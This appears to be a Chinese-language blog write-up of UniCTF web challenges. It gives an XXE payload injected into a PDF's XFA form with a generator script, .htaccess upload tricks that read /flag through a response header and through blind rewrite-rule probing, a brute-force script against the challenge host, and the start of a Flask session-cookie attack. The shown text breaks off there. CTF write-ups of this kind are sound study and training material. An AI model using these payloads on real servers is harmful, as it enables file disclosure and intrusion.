<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>UniCTF Webéƒ¨åˆ†é¢˜è§£ | æ¥½æ¥½ä¾domain</title><meta name="author" content="æ¥½ä¾"><meta name="copyright" content="æ¥½ä¾"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="åŒå¿—ä»éœ€åŠªåŠ›">
<meta property="og:type" content="article">
<meta property="og:title" content="UniCTF Webéƒ¨åˆ†é¢˜è§£">
<meta property="og:url" content="https://leyi.live/2026/01/31/UniCTF-Web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/index.html">
<meta property="og:site_name" content="æ¥½æ¥½ä¾domain">
<meta property="og:description" content="åŒå¿—ä»éœ€åŠªåŠ›">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://leyi.live/img/post26.jpg">
<meta property="article:published_time" content="2026-01-31T04:02:50.000Z">
<meta property="article:modified_time" content="2026-01-31T10:09:58.575Z">
<meta property="article:author" content="æ¥½ä¾">
<meta property="article:tag" content="Java">
<meta property="article:tag" content="XML">
<meta property="article:tag" content="python">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://leyi.live/img/post26.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "UniCTF Webéƒ¨åˆ†é¢˜è§£",
  "url": "https://leyi.live/2026/01/31/UniCTF-Web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/",
  "image": "https://leyi.live/img/post26.jpg",
  "datePublished": "2026-01-31T04:02:50.000Z",
  "dateModified": "2026-01-31T10:09:58.575Z",
  "author": [
    {
      "@type": "Person",
      "name": "æ¥½ä¾",
      "url": "https://leyi.live"
    }
  ]
}</script><link rel="shortcut icon" href="/img/icon.jpg"><link rel="canonical" href="https://leyi.live/2026/01/31/UniCTF-Web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"No results found for: ${query}","hits_stats":"${hits} articles found"}},
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":500,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'UniCTF Webéƒ¨åˆ†é¢˜è§£',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><style>
  #custom-loading {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: #0B0B0B;
    z-index: 9999;
    display: flex;
    justify-content: center;
    align-items: center;
    transition: opacity 0.5s ease;
  }
  .loading-content {
    position: relative;
    width: 100%;
    height: 100%;
  }
  .loading-content span {
    width: 8vmin;
    height: 8vmin;
    border-radius: 4vmin;
    backface-visibility: hidden;
    position: absolute;
    animation-name: loadingMove;
    animation-timing-function: cubic-bezier(0.4, 0, 1, 0.8);
    animation-iteration-count: infinite;
    animation-duration: 3s;
    top: 50%;
    left: 50%;
    transform-origin: -4vmin center;
  }
  .loading-content span:nth-child(1) { background: #E5E6E5; animation-delay: -0.5s; opacity: 0; }
  .loading-content span:nth-child(2) { background: #494A49; animation-delay: -1s; opacity: 0; }
  .loading-content span:nth-child(3) { background: #8F908F; animation-delay: -1.5s; opacity: 0; }
  .loading-content span:nth-child(4) { background: #E5E6E5; animation-delay: -2s; opacity: 0; }
  .loading-content span:nth-child(5) { background: #494A49; animation-delay: -2.5s; opacity: 0; }
  .loading-content span:nth-child(6) { background: #8F908F; animation-delay: -3s; opacity: 0; }
  @keyframes loadingMove {
    0% { transform: scale(1) rotate(0deg) translate3d(0, 0, 1px); }
    30% { opacity: 1; }
    100% { z-index: 10; transform: scale(0) rotate(360deg) translate3d(0, 0, 1px); }
  }
</style>
<script>
  // ç«‹å³å†™å…¥åŠ è½½åŠ¨ç”»ï¼Œä¸ç­‰å¾…ä»»ä½•äº‹ä»¶
  document.write(`
    <div id="custom-loading">
      <div class="loading-content">
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
      </div>
    </div>
  `);
</script>
<meta name="generator" content="Hexo 8.1.1"></head><body><div id="web_bg" style="background-image: url(/img/background.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">33</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">3</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><span> é¦–é¡µ</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><span> æ–‡ç« </span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><span> æ ‡ç­¾</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><span> åˆ†ç±»</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><span> é“¾æ¥</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/img/post26.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/bar0.gif" alt="Logo"><span class="site-name">æ¥½æ¥½ä¾domain</span></a><a class="nav-page-title" href="/"><span class="site-name">UniCTF Webéƒ¨åˆ†é¢˜è§£</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><span> é¦–é¡µ</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><span> æ–‡ç« </span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><span> æ ‡ç­¾</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><span> åˆ†ç±»</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><span> é“¾æ¥</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">UniCTF Webéƒ¨åˆ†é¢˜è§£</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2026-01-31T04:02:50.000Z" title="Created 2026-01-31 12:02:50">2026-01-31</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-01-31T10:09:58.575Z" title="Updated 2026-01-31 18:09:58">2026-01-31</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9B%B8%E5%85%B3/">CTFç›¸å…³</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="UniCTF-Webéƒ¨åˆ†é¢˜è§£"><a href="#UniCTF-Webéƒ¨åˆ†é¢˜è§£" class="headerlink" title="UniCTF Webéƒ¨åˆ†é¢˜è§£"></a>UniCTF Webéƒ¨åˆ†é¢˜è§£</h1><p>å¯’å‡æ‰“çš„å°æ¯”èµ›ï¼Œè™½è¯´æœ‰æ–°ç”Ÿèµ›é“ä½†è¿˜æ˜¯è¢«å…¶ä»–å­¦æ ¡çš„æ–°ï¼ˆå¤§ï¼‰ç”Ÿï¼ˆä½¬ï¼‰è–„çº±äº†ï¼ˆæˆ–è®¸ä¹Ÿè·Ÿæˆ‘ä»¬ä¸€ä¸ªé˜Ÿä¼ä¸‰ä¸ªWebæ‰‹æœ‰å…³ç³»ï¼Ÿ</p>
<p>Webæ–¹å‘æ”¾äº†12é“é¢˜ï¼Œæˆ‘ä»¬åšäº†7é“ï¼Œè¿™ä¸ªæˆç»©å¯¹äºæˆ‘ä»¬è¿™ç§åˆå‡ºèŒ…åºçš„èœé¸¡ä¹Ÿè¿˜ç®—ä¸é”™ğŸ˜</p>
<p>è´´ä¸€å¼ æ–°ç”Ÿèµ›é“çš„æ’å</p>
<p><img src="/img/post/image-20260131100231640.png" alt="image-20260131100231640"></p>
<p>è¿˜éœ€è¦åŠªåŠ›</p>
<br/>

<h2 id="SecureDoc"><a href="#SecureDoc" class="headerlink" title="SecureDoc"></a>SecureDoc</h2><p>é¢˜ç›®è¯´æ˜¯ä¸€ä¸ªPDFçš„è§£æå™¨ï¼Œéšä¾¿ä¼ ä¸€ä¸ªPDFï¼Œå¼¹å‡ºæ¥çš„é¡µé¢æ˜¾ç¤ºæœªåœ¨æ–‡ä»¶ä¸­æ‰¾åˆ°XFA</p>
<p><img src="/img/post/image-20260130232321391.png" alt="image-20260130232321391"></p>
<p><strong>XFA</strong>æ˜¯ä¸€ç§åŸºäº <strong>XML</strong> çš„æŠ€æœ¯è§„èŒƒï¼Œä¸»è¦ç”¨äºåœ¨ <strong>PDF æ–‡æ¡£</strong> ä¸­åˆ›å»ºã€æ¸²æŸ“å’Œå¤„ç†å¤æ‚çš„ã€åŠ¨æ€çš„äº¤äº’å¼è¡¨å•ï¼Œæ—¢ç„¶æ˜¯XMLæ ¼å¼çš„æ–‡æœ¬ï¼Œè‡ªç„¶èƒ½æƒ³åˆ°XXEï¼Œè¿™é‡Œä½¿ç”¨è„šæœ¬ä¸ºPDFæ³¨å…¥XFA</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> PyPDF2</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inject_xfa_to_pdf</span>(<span class="params">input_pdf, output_pdf, xfa_xml</span>):</span><br><span class="line">    <span class="comment"># è¯»å–åŸå§‹PDF</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_pdf, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        reader = PyPDF2.PdfReader(f)</span><br><span class="line">        writer = PyPDF2.PdfWriter()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># å¤åˆ¶æ‰€æœ‰é¡µé¢</span></span><br><span class="line">        <span class="keyword">for</span> page <span class="keyword">in</span> reader.pages:</span><br><span class="line">            writer.add_page(page)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># åˆ›å»ºXFAæ•°æ®æµ - æ–°ç‰ˆPyPDF2æ–¹å¼</span></span><br><span class="line">        <span class="keyword">from</span> PyPDF2.generic <span class="keyword">import</span> DecodedStreamObject, NameObject, ArrayObject, DictionaryObject</span><br><span class="line"></span><br><span class="line">        <span class="comment"># æ–¹æ³•1: ä½¿ç”¨DecodedStreamObject</span></span><br><span class="line">        xfa_stream = DecodedStreamObject()</span><br><span class="line">        xfa_stream._data = xfa_xml.encode()  <span class="comment"># ç›´æ¥è®¾ç½®_dataå±æ€§</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># æ–¹æ³•2: æˆ–è€…ä½¿ç”¨encodedå±æ€§</span></span><br><span class="line">        <span class="comment"># xfa_stream.encoded_data = xfa_xml.encode()</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># æ·»åŠ åˆ°writer</span></span><br><span class="line">        xfa_ref = writer._add_object(xfa_stream)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># åˆ›å»ºAcroFormå­—å…¸</span></span><br><span class="line">        acroform = DictionaryObject(&#123;</span><br><span class="line">            NameObject(<span class="string">&#x27;/Fields&#x27;</span>): ArrayObject(),</span><br><span class="line">            NameObject(<span class="string">&#x27;/XFA&#x27;</span>): xfa_ref</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># è®¾ç½®Catalog</span></span><br><span class="line">        writer._root_object.update(&#123;</span><br><span class="line">            NameObject(<span class="string">&#x27;/AcroForm&#x27;</span>): acroform</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># ç¡®ä¿æœ‰Catalogå¯¹è±¡</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;/Catalog&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> writer._root_object:</span><br><span class="line">            catalog = DictionaryObject()</span><br><span class="line">            writer._root_object[NameObject(<span class="string">&#x27;/Catalog&#x27;</span>)] = catalog</span><br><span class="line"></span><br><span class="line">        <span class="comment"># å†™å…¥æ–‡ä»¶</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(output_pdf, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> out_f:</span><br><span class="line">            writer.write(out_f)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æµ‹è¯•XFA XML</span></span><br><span class="line">evil_xfa = <span class="string">&#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE xdp [</span></span><br><span class="line"><span class="string">&lt;!ENTITY xxe SYSTEM &quot;file://flag&quot;&gt;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;xdp:xdp xmlns:xdp=&quot;http://ns.adobe.com/xdp/&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;template&gt;</span></span><br><span class="line"><span class="string">    &lt;subform name=&quot;form1&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;field name=&quot;exploit&quot;&gt;&amp;xxe;&lt;/field&gt;</span></span><br><span class="line"><span class="string">    &lt;/subform&gt;</span></span><br><span class="line"><span class="string">&lt;/template&gt;</span></span><br><span class="line"><span class="string">&lt;/xdp:xdp&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    inject_xfa_to_pdf(<span class="string">&#x27;writeup.pdf&#x27;</span>, <span class="string">&#x27;evil.pdf&#x27;</span>, evil_xfa)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;æˆåŠŸåˆ›å»ºæ¶æ„PDF: evil.pdf&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;é”™è¯¯: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>å°†æ³¨å…¥åçš„PDFæ–‡ä»¶ä¸Šä¼ ç»™æœåŠ¡å™¨ï¼Œè§£æå‡ºæ¥å°±æ˜¯flag</p>
<p><img src="/img/post/image-20260130233237281.png" alt="image-20260130233237281"></p>
<br/>

<h2 id="ezUpload"><a href="#ezUpload" class="headerlink" title="ezUpload"></a>ezUpload</h2><p>WAFå¦‚ä¸‹</p>
<p><img src="/img/post/image-20260130233409304.png" alt="image-20260130233409304"></p>
<p>å¯¹æ–‡ä»¶å¤§å°å¡çš„å¾ˆæ­»ï¼Œè€Œä¸”æƒé™æ§åˆ¶æ¯”è¾ƒä¸¥æ ¼ï¼Œè®¿é—®<code>/upload</code>è·¯ç”±ä¼šæŠ¥<code>Access Denied</code>ã€‚è€ƒè™‘åˆ°æœåŠ¡å™¨æ˜¯Apacheï¼Œå¤šåŠæ˜¯ä¸Šä¼ <code>.htaccess</code>é…ç½®æ–‡ä»¶</p>
<p>è¯•å‡ºæ¥å¯ä»¥ä½¿ç”¨å“åº”å¤´å›æ˜¾</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Options +Indexes</span><br><span class="line">DirectoryIndex /test.txt</span><br><span class="line">Header set X-Flag &quot;expr=%&#123;file:/flag&#125;&quot;</span><br></pre></td></tr></table></figure>

<p><code>Options +Indexes</code>ç”¨äºå¼€æ”¾ç´¢å¼•ï¼Œå…è®¸å®¢æˆ·ç«¯æŸ¥çœ‹ç›®å½•ç»“æ„ï¼Œç”¨äºåº”ä»˜æƒé™æ§åˆ¶</p>
<p><code>DirectoryIndex /test.txt</code>è®¾ç½®é»˜è®¤ç´¢å¼•ï¼Œç”¨äºåœ¨å®¢æˆ·ç«¯è®¿é—®<code>/upload</code>è·¯ç”±æ—¶å±•ç¤ºçš„é»˜è®¤æ–‡ä»¶ï¼Œè¿™é‡Œ<code>/test.txt</code>æ˜¯ä»ç½‘ç«™çš„è·Ÿç›®å½•ç®—èµ·ï¼Œå¦‚æœæ²¡æœ‰è¯¥æ–‡ä»¶å°±ä¼šå±•ç¤ºç›®å½•ç»“æ„</p>
<p><code>Header set X-Flag &quot;expr=%{file:/flag}&quot;</code>ç”¨äºè®¾ç½®å“åº”å¤´ï¼Œexprè¡¨è¾¾å¼<code>%{file:/flag}</code>è¡¨ç¤ºå°†&#x2F;flagæ–‡ä»¶å†…å®¹è´´å…¥<code>X-Flag</code>è¿™ä¸ªå“åº”å¤´ä¸­</p>
<p>ç”±äºæ‰“å¼€æ–‡ä»¶çš„exprè¡¨è¾¾å¼éœ€è¦å¤„ç†æ–‡ä»¶æ—¶æ‰èƒ½è§¦å‘ï¼Œéœ€è¦å‰ä¸¤æ¡å»å¼ºè¿«apacheå¯»æ‰¾æ ¹ç›®å½•ä¸‹çš„test.txtæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶å®é™…å­˜ä¸å­˜åœ¨ä¸é‡è¦ï¼Œä¸»è¦æ˜¯è§¦å‘apacheæœåŠ¡å™¨çš„æ–‡ä»¶å¤„ç†æ“ä½œ</p>
<p>ä¸Šä¼ æˆåŠŸåå†æ¬¡è®¿é—®<code>/upload</code>è·¯ç”±ï¼ŒæŸ¥çœ‹å“åº”å¤´</p>
<p><img src="/img/post/image-20260125173115056.png" alt="image-20260125173115056"></p>
<br/>

<h2 id="ezUpload-Revenge"><a href="#ezUpload-Revenge" class="headerlink" title="ezUpload Revenge!!"></a>ezUpload Revenge!!</h2><p>ä½œä¸ºä¸Šä¸€é¢˜çš„revengeï¼Œæœ¬é¢˜è¿‡æ»¤äº†æ›´å¤šç‰¹æ®Šå­—ç¬¦</p>
<p><img src="/img/post/image-20260130234751335.png" alt="image-20260130234751335"></p>
<p>æ­¤å¤–ï¼Œç»è¿‡æµ‹è¯•ï¼Œè¿‡æ»¤äº†ä¸€äº›å…³é”®å­—æ¯”å¦‚<code>expr=</code>ã€<code>env</code>ã€<code>ErrorDocument</code>ã€<code>redirect</code>ç­‰ï¼Œä¹Ÿæœ‰å¯èƒ½ä¸Šä¸€é¢˜ä¹Ÿè¿‡æ»¤äº†ä¸è¿‡æˆ‘æ²¡ç”¨ä¸Š</p>
<p>è¿™é¢˜å°±å¾ˆæœ‰æ„æ€äº†ï¼Œå¾—ä¾èµ–ç›²æ³¨ï¼Œpayloadä¹Ÿå°±ä¸‰è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RewriteEngine On</span><br><span class="line">RewriteCond expr &quot;file(&#x27;/flag&#x27;) =~ /^UniCTF&#123;/&quot;</span><br><span class="line">RewriteRule ^readflag /upload/success [R=301,L]</span><br></pre></td></tr></table></figure>

<p><code>RewriteEngine On</code>ç”¨äºå¼€å¯å¯ç”¨ URL é‡å†™å¼•æ“ï¼Œè¿™å…è®¸æˆ‘ä»¬æ”¹å†™ä¸€äº›é‡å®šå‘çš„è§„åˆ™</p>
<p><code>RewriteCond expr &quot;file(&#39;/flag&#39;) =~ /^UniCTF{/&quot;</code>è¯¥è¯­å¥å……å½“äº†ä¸€ä¸ªæ¡ä»¶åˆ¤æ–­çš„è§’è‰²ï¼Œ<code>RewriteCond</code>ç”¨äºæ£€æŸ¥ç‰¹å®šæ¡ä»¶æ˜¯å¦æˆç«‹ï¼Œ<code>expr &quot;file(&#39;/flag&#39;)</code>è¡¨ç¤ºè¿™æå–&#x2F;flagæ–‡ä»¶çš„å†…å®¹ï¼Œ<code>=~</code>ä¸ºæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…æ“ä½œç¬¦ï¼Œè¿™å¥è¯çš„æ„æ€å°±æ˜¯åˆ¤æ–­&#x2F;flagæ–‡ä»¶æ˜¯ä¸æ˜¯ä»¥<code>UniCTF{</code>å¼€å¤´</p>
<p>ä¸Šé¢çš„æ¡ä»¶å€˜è‹¥æˆç«‹ï¼Œåˆ™ä¼šè§¦å‘<code>RewriteRule ^readflag /upload/success [R=301,L]</code>ï¼Œè¿™è¡¨ç¤ºä¸€ä¸ªé‡å®šå‘è§„åˆ™ï¼Œè®¿é—®<code>/upload/readflag</code>è·¯ç”±ä¼šè¿›è¡Œ301é‡å®šå‘åˆ°<code>/upload/success</code></p>
<p>é€šè¿‡ä¸Šé¢çš„é€»è¾‘åˆ¤æ–­ï¼Œå½¢æˆäº†ä¸€ä¸ªç±»ä¼¼å¸ƒå°”ç›²æ³¨çš„ç¯å¢ƒï¼Œæ¥ä¸‹æ¥å°±æ˜¯å†™ä¸€ä¸ªç›²æ³¨è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line">session.proxies = &#123;<span class="string">&quot;http&quot;</span>: <span class="literal">None</span>, <span class="string">&quot;https&quot;</span>: <span class="literal">None</span>&#125;</span><br><span class="line"></span><br><span class="line">TARGET_URL = <span class="string">&quot;http://80-4abe9029-a761-44c3-9159-406b239dbd79.challenge.ctfplus.cn/&quot;</span></span><br><span class="line">TRIGGER_URL = TARGET_URL + <span class="string">&quot;upload/readflag&quot;</span></span><br><span class="line"></span><br><span class="line">alphabet = string.ascii_letters + string.digits + <span class="string">&quot;_-!&#125;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;UniCTF&#123;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>():</span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> alphabet:</span><br><span class="line">            test_char = char</span><br><span class="line">            <span class="keyword">if</span> char <span class="keyword">in</span> <span class="string">&quot;.+*?^$()[]&#123;&#125;|\\&quot;</span>:</span><br><span class="line">                test_char = <span class="string">&quot;\\&quot;</span> + char</span><br><span class="line"></span><br><span class="line">            htaccess = <span class="string">f&quot;&quot;&quot;RewriteEngine On</span></span><br><span class="line"><span class="string">RewriteCond expr &quot;file(&#x27;/flag&#x27;) =~ /^<span class="subst">&#123;flag&#125;</span><span class="subst">&#123;test_char&#125;</span>/&quot;</span></span><br><span class="line"><span class="string">RewriteRule ^readflag /upload/success [R=301,L]&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                session.post(TARGET_URL, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;.htaccess&#x27;</span>, htaccess)&#125;, timeout=<span class="number">10</span>)</span><br><span class="line">                r = session.get(TRIGGER_URL, allow_redirects=<span class="literal">False</span>, timeout=<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;\ræµ‹è¯•ä¸­: <span class="subst">&#123;flag&#125;</span><span class="subst">&#123;char&#125;</span>&quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> r.status_code == <span class="number">301</span>:</span><br><span class="line">                    flag += char</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;\n[+] å‘½ä¸­! ç›®å‰ Flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="keyword">if</span> char == <span class="string">&quot;&#125;&quot;</span>: <span class="keyword">return</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;\n[!] è¯·æ±‚å‡ºé”™: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">solve()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œï¼Œæˆ‘çš„è„šæœ¬åˆ°æœ€åä¸€ä½ä¼šé™·å…¥å¾ªç¯ï¼Œéœ€è¦æš‚åœè„šæœ¬æ‰‹åŠ¨åŠ ä¸ŠèŠ±æ‹¬å·</p>
<p><img src="/img/post/image-20260127230117115.png" alt="image-20260127230117115"></p>
<p>å¾—åˆ°flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UniCTF&#123;sz_5b6502fd-1d30-4362-bc20-36196ea24831&#125;</span><br></pre></td></tr></table></figure>

<br/>

<h2 id="CloudDiag"><a href="#CloudDiag" class="headerlink" title="CloudDiag"></a>CloudDiag</h2><p>æ³¨å†Œå®Œæˆåç»™äº†ä¸€ä¸ªCookie</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">session=eyJib290X2lkIjoiMTc2OTU2OTQzMi41MDMzNiIsInVzZXJfaWQiOjJ9.aXmBUg.2a6cpR3mfkCI7V2C3VrzOWmc3mI</span><br></pre></td></tr></table></figure>

<p>æœäº†ä¸€ä¸‹æ˜¯flask sessionï¼Œè¿˜æœ‰ä¸ªä¸“é—¨è§£ç å®ƒçš„å·¥å…·<code>flask-unsign</code>ï¼Œè§£ç å‡ºæ¥çœ‹åˆ°<code>user_id</code>ä¸º2</p>
<p><img src="/img/post/image-20260128125201802.png" alt="image-20260128125201802"></p>
